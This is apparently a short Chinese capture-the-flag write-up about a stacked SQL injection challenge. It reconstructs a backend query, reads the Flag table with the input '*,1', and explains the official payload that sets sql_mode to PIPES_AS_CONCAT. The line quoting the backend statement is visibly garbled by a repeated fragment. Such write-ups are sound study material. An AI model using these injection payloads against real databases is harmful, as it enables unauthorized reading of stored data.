#SQL 注入 #堆叠注入

这道题目需要我们去对后端语句进行猜测

输入的内容为\*,1

内置的 sql 语句为

```sql
sql = "select".sql = "select ".sql="select".post['query']."||flag from Flag";
```

如果$post['query']的数据为*,1，sql 语句就变成了`select *,1||flag from Flag`，也就是`select \*,1 from Flag`，也就是直接查询出了 Flag 表中的所有内容

官方给的 payload 是 1;set sql_mode=PIPES_AS_CONCAT;select 1

拼接一下就是 select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag
关于 `sql_mode` : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 `PIPES_AS_CONCAT` 将 `||` 视为字符串的连接操作符而非 “或” 运算符
